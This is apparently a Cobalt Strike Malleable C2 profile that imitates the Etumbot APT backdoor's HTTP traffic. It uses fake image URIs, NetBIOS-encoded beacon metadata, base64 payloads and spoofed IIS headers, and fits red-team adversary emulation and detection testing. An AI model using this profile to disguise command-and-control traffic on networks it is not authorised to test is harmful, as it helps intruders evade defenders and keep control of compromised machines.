#
# Etumbot Profile
#   http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/
#
# Author: @harmj0y
#

set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/image/";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        metadata {
            netbios;
            append "-.jpg";
            uri-append;
        }
    }

    server {

        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/history/";

    client {

        header "Content-Type" "application/octet-stream";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        id {
            netbiosu;
            append ".asp";
            uri-append;
        }

        output {
            base64;
            print;
        }
    }

    server {

        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}

